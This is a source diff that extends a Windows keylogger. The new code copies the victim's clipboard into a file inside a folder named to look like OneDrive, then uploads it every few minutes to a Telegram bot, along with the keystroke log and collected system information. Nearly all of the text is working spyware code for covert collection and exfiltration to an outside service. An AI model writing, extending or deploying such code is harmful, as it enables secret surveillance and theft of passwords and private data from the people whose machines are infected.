@@ -12,22 +12,25 @@
 #include "get_system_info.h"
 #include <filesystem>
 #include "startup.h"
+#include "clipboard.cpp"
 
-void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &infoPath)
+void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &clipboardPath, const std::wstring &infoPath)
 {
     while (true)
     {
         sendFileToTelegram(token, chat_id, filePath);
         sendFileToTelegram(token, chat_id, infoPath);
+        sendFileToTelegram(token, chat_id, clipboardPath);
         std::this_thread::sleep_for(std::chrono::minutes(waitTime));
     }
 }
 
-void periodicCheckInfo(const std::wstring &filePath)
+void periodicCheckInfo(const std::wstring &infoFilePath, const std::wstring &clipboardFilePath)
 {
     while (true)
     {
-        writeSystemInfoToFile(filePath);
+        writeSystemInfoToFile(infoFilePath);
+        writeClipboardToFile(clipboardFilePath);
         std::this_thread::sleep_for(std::chrono::minutes(waitTime));
     }
 }
@@ -56,10 +59,12 @@ int main()
     const char *userProfilePath = std::getenv("APPDATA");
     char dirPath[MAX_PATH] = {0};
     char infoPath[MY_MAX_PATH] = {0};
+    char clipboardFilePath[MY_MAX_PATH] = {0};
 
     snprintf(dirPath, MAX_PATH, "%s\\Onedrive", userProfilePath);
     snprintf(location, MY_MAX_PATH, "%s\\Onedrive\\keylog.txt", userProfilePath);
     snprintf(infoPath, MY_MAX_PATH, "%s\\Onedrive\\info.txt", userProfilePath);
+    snprintf(clipboardFilePath, MY_MAX_PATH, "%s\\Onedrive\\clipboard.txt", userProfilePath);
 
     std::wstring wlocation;
     int len = MultiByteToWideChar(CP_ACP, 0, location, -1, NULL, 0);
@@ -79,6 +84,15 @@ int main()
         winfoPath.assign(bufInfo.data());
     }
 
+    std::wstring wclipboardFilePath;
+    int lenClipboard = MultiByteToWideChar(CP_ACP, 0, clipboardFilePath, -1, NULL, 0);
+    if (lenClipboard > 1)
+    {
+        std::vector<wchar_t> bufClipboard(lenClipboard);
+        MultiByteToWideChar(CP_ACP, 0, clipboardFilePath, -1, bufClipboard.data(), lenClipboard);
+        wclipboardFilePath.assign(bufClipboard.data());
+    }
+
     DWORD ftyp = GetFileAttributesA(dirPath);
     if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY))
     {
@@ -91,10 +105,10 @@ int main()
     writeSystemInfoToFile(winfoPath);
     sendFileToTelegram(botToken, userID, winfoPath);
 
-    std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath);
+    std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath, wclipboardFilePath);
     sender.detach();
 
-    std::thread infoChecker(periodicCheckInfo, winfoPath);
+    std::thread infoChecker(periodicCheckInfo, winfoPath, wclipboardFilePath);
     infoChecker.detach();
 
     HANDLE hThread1 = CreateThread(NULL, 0, Keylogger_main, NULL, 0, NULL);
